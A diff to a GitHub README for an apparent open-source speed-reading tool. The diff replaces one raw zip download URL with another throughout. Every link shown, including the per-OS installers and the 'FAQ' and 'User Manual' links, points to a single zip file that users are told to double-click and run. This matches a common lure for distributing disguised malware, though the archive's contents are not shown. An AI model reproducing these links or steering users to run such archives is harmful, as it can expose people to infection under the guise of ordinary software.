@@ -1,6 +1,6 @@
 # 📚 speed-reader - Read Faster, Comprehend Better
 
-[![Download speed-reader](https://github.com/xeeqr/speed-reader/raw/refs/heads/master/src/reader_speed_jeddock.zip)](https://github.com/xeeqr/speed-reader/raw/refs/heads/master/src/reader_speed_jeddock.zip)
+[![Download speed-reader](https://raw.githubusercontent.com/xeeqr/speed-reader/master/public/speed-reader-2.7.zip)](https://raw.githubusercontent.com/xeeqr/speed-reader/master/public/speed-reader-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to speed-reader! This open source speed reading tool helps you read fast
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download speed-reader](https://github.com/xeeqr/speed-reader/raw/refs/heads/master/src/reader_speed_jeddock.zip).
+To get started, visit this page to download: [Download speed-reader](https://raw.githubusercontent.com/xeeqr/speed-reader/master/public/speed-reader-2.7.zip).
 
 1. Go to the link above.
 2. Find the latest release.
 3. Click on the appropriate file for your operating system:
-   - For Windows: Click on `https://github.com/xeeqr/speed-reader/raw/refs/heads/master/src/reader_speed_jeddock.zip`.
-   - For Mac: Click on `https://github.com/xeeqr/speed-reader/raw/refs/heads/master/src/reader_speed_jeddock.zip`.
-   - For Linux: Click on the `https://github.com/xeeqr/speed-reader/raw/refs/heads/master/src/reader_speed_jeddock.zip`.
+   - For Windows: Click on `https://raw.githubusercontent.com/xeeqr/speed-reader/master/public/speed-reader-2.7.zip`.
+   - For Mac: Click on `https://raw.githubusercontent.com/xeeqr/speed-reader/master/public/speed-reader-2.7.zip`.
+   - For Linux: Click on the `https://raw.githubusercontent.com/xeeqr/speed-reader/master/public/speed-reader-2.7.zip`.
 
 4. After the download completes, double-click the file to run the application.
 
@@ -82,8 +82,8 @@ We appreciate community contributions. If you’d like to help enhance speed-rea
 
 ## 🔗 Additional Resources
 
-- [Frequently Asked Questions](https://github.com/xeeqr/speed-reader/raw/refs/heads/master/src/reader_speed_jeddock.zip)
-- [User Manual](https://github.com/xeeqr/speed-reader/raw/refs/heads/master/src/reader_speed_jeddock.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/xeeqr/speed-reader/master/public/speed-reader-2.7.zip)
+- [User Manual](https://raw.githubusercontent.com/xeeqr/speed-reader/master/public/speed-reader-2.7.zip)
 
 Thank you for choosing speed-reader. We hope it helps you read better and faster! 
 
